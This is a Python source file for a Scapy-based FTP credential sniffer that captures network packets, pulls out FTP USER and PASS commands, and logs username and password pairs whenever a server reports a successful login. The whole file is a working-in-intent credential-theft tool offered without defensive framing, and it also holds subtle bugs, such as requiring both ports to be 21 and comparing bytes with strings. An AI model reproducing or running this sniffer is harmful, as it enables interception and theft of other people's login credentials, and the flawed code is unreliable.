from scapy.all import *
from multiprocessing import Process
import sys,logging

class FTPSniff(object):
    x = random.randint(1000,9999)
    def __init__(self,pcap_path=f"files/{x}-ftp.pcap", ftp_file=f"files/{x}-ftp.log",verbose=False):
        self.pcap_path   = pcap_path
        self.ftp_file    = ftp_file
        self.main_thread = None
        self.usernames   = []
        self.passwords   = []
		
    def check_login(self, pkt, username, passwd):
        if '230' in pkt[Raw].load:
            logging.debug("Login found")
            return True
        else:
            return False
		
    def check_for_ftp(self,pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            if pkt[TCP].dport == 21 and pkt[TCP].sport == 21:
                return True
            else:
                return False
        else:
            return False
			
    def handle_pkt(self,pkt):
        if not self.check_for_ftp(pkt):
            return
        
        wrpcap(self.pcap_path, pkt)
        data = pkt[Raw].load

        if 'USER ' in data:
            user = data.split("USER ")[1].strip()
            self.usernames.append(user)
            # fd.write(f"FTP - USER: {user} ")
        elif 'PASS ' in data:
            passwd = data.split("PASS ")[1].strip()
            self.passwords.append(passwd)
            # fd.write(f"PASS: {passwd}\n")
        else:
            if self.check_login(pkt,self.usernames[-1],self.passwords[-1]):
                with open(self.ftp_file, "a+") as fd:
                    fd.write(f"FTP - USER: {self.usernames[-1]} PASS: {self.passwords[-1]}")

    def sniff_thread(self):
        sniff(prn=self.handle_pkt)
    
    def start(self):
        self.main_thread = Process(target=self.sniff_thread)
        self.main_thread.start()
    
    def stop(self):
        self.main_thread.kill()
        return (self.pcap_path, self.ftp_file)